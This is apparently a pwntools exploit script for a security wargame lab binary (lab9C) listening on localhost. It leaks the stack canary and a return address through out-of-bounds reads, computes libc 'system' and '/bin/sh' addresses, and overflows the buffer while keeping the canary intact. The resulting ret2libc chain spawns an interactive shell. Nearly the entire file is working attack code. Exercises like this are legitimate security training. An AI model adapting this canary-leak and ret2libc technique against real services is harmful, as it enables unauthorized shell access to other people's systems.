from pwn import *

#proc = process("/levels/lab09/lab9C")
proc = remote("localhost", 9943)

proc.sendline("2")
proc.recv(1024)
proc.sendline("257")
ret = proc.recv(1024)
canary = int(ret.split('\n')[0].split()[-1])
proc.clean()

proc.sendline("2")
proc.recv(1024)
proc.sendline("261")
ret = proc.recv(1024)
return_addr = int(ret.split('\n')[0].split()[-1])


retn = return_addr & 0xffffffff if return_addr < 0 else return_addr
can = canary & 0xffffffff if canary < 0 else canary

sys = retn + 0x2681d
binsh = retn + 0x149259

buff = [42] * 256

for num in buff:
    proc.sendline("1")
    proc.sendline(str(num))
    proc.recv(500)

proc.sendline("1")
proc.sendline(str(can))
proc.recv(500)

buff = [42] * 3
for num in buff:
    proc.sendline("1")
    proc.recv(500)
    proc.sendline(str(num))
    proc.recv(500)

buff = [sys, 42, binsh]
for num in buff:
    proc.sendline("1")
    proc.recv(500)
    proc.sendline(str(num))
    proc.recv(500)

proc.sendline("3")
proc.interactive()
